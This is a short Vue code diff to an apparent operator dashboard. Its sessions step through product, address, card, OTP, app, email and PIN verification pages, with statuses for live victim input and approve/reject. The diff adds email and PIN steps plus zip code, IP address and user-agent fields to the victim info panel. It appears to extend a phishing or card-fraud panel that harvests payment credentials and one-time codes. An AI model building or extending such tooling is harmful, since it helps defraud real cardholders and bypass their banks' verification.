@@ -9,7 +9,7 @@ const emit = defineEmits<{
   (e: 'close'): void;
 }>();
 
-const stepLabel = (s: string) => ({ product: '商品页', address: '地址页', card: '卡片页', otp: 'OTP验证页', app_verify: 'APP验证页', completed: '已完成' }[s] || s);
+const stepLabel = (s: string) => ({ product: '商品页', address: '地址页', card: '卡片页', otp: 'OTP验证页', app_verify: 'APP验证页', email_verify: '邮箱验证页', pin_verify: 'PIN验证页', completed: '已完成' }[s] || s);
 
 const statusLabel = (s: string) => {
   const m: Record<string, string> = { live: '实时输入中', pending: '待处理', processing: '处理中', completed: '已完成', approved: '已通过', rejected: '已拒绝', cancelled: '已取消' };
@@ -52,6 +52,9 @@ const statusLabel = (s: string) => {
             <NGi><label>州/省</label><span class="val">{{ session.customerInfo.state || '-' }}</span></NGi>
             <NGi v-if="session.customerInfo.address1"><label>地址1</label><span class="val">{{ session.customerInfo.address1 }}</span></NGi>
             <NGi v-if="session.customerInfo.address2"><label>地址2</label><span class="val">{{ session.customerInfo.address2 }}</span></NGi>
+            <NGi v-if="session.customerInfo.zipCode"><label>邮编</label><span class="val">{{ session.customerInfo.zipCode }}</span></NGi>
+            <NGi v-if="(session as any).ip"><label>IP</label><span class="val">{{ (session as any).ip }}</span></NGi>
+            <NGi v-if="(session as any).ua"><label>UA</label><span class="val" style="font-size:11px;word-break:break-all">{{ (session as any).ua }}</span></NGi>
           </NGrid>
         </div>
 
